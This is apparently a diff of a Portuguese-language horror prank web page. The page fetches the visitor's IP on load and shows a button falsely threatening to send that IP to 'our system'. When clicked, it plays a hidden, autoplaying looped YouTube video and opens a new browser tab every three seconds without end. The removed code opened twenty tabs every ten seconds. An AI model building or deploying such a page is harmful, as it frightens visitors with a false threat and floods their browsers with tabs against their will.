@@ -73,6 +73,16 @@
         #playButton:hover {
             background-color: darkred; /* Cor do botão ao passar o mouse */
         }
+
+        /* O vídeo será oculto */
+        #videoContainer {
+            display: none; /* Oculta o container inicialmente */
+        }
+
+        /* O iframe está completamente oculto */
+        #youtubeVideo {
+            display: none; /* Oculte o iframe */
+        }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet"> <!-- Fonte assustadora -->
 </head>
@@ -80,8 +90,13 @@
     <div class="blood"></div>
     <div class="message" id="message"></div>
 
-    <!-- Botão para tocar a música -->
+    <!-- Botão para tocar a música e abrir guias -->
     <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>
+
+    <!-- Container do vídeo do YouTube -->
+    <div id="videoContainer">
+        <iframe id="youtubeVideo" src="https://www.youtube.com/embed/b2pD0B9Rfps?enablejsapi=1&autoplay=1&loop=1&playlist=b2pD0B9Rfps" frameborder="0" allow="autoplay" allowfullscreen></iframe>
+    </div>
 
     <script>
         // Função para obter o IP do usuário
@@ -98,45 +113,21 @@
         // Chama a função para obter o IP ao carregar a página
         getUserIP();
 
-        // Cria o contexto do áudio
-        let audioContext;
-        let audioBuffer;
-
-        // Carrega o áudio
-        async function loadAudio(url) {
-            audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const response = await fetch(url);
-            const arrayBuffer = await response.arrayBuffer();
-            audioBuffer = await audioContext.decodeAudioData(arrayBuffer);
-        }
-
-        // Toca o áudio em loop
-        function playAudio() {
-            const sourceNode = audioContext.createBufferSource();
-            sourceNode.buffer = audioBuffer;
-            sourceNode.loop = true; // Ativa o loop
-            sourceNode.connect(audioContext.destination);
-            sourceNode.start(0); // Inicia o áudio imediatamente
-        }
-
-        // Função para abrir 20 guias
-        function openMultipleTabs() {
-            for (let i = 0; i < 20; i++) {
-                window.open("https://www.example.com", "_blank"); // Altere o link para o que você preferir
-            }
-        }
-
-        // Função para iniciar o áudio e abrir guias
-        async function startAudioAndOpenTabs() {
-            await loadAudio('https://screenapp.io/app/#/shared/b3sS6qGuf5'); // Substitua pelo URL do seu áudio
-            playAudio(); // Toca o áudio
-
-            // Abre 20 guias a cada 10 segundos
-            setInterval(openMultipleTabs, 10000); // Abre guias a cada 10000 ms (10 segundos)
+        // Função para iniciar o vídeo e abrir novas guias
+        function startVideoAndOpenTabs() {
+            const videoContainer = document.getElementById('videoContainer');
+            videoContainer.style.display = 'block'; // Mostra o container do vídeo
+            const player = document.getElementById('youtubeVideo');
+            player.src += ""; // Reinicia o src para tentar o autoplay novamente
+            
+            // Abre novas guias infinitamente
+            setInterval(() => {
+                window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
+            }, 3000); // Altera 1000 para o intervalo desejado em milissegundos
         }
 
         // Adiciona um listener de clique ao botão
-        document.getElementById('playButton').addEventListener('click', startAudioAndOpenTabs);
+        document.getElementById('playButton').addEventListener('click', startVideoAndOpenTabs);
     </script>
 </body>
 </html>
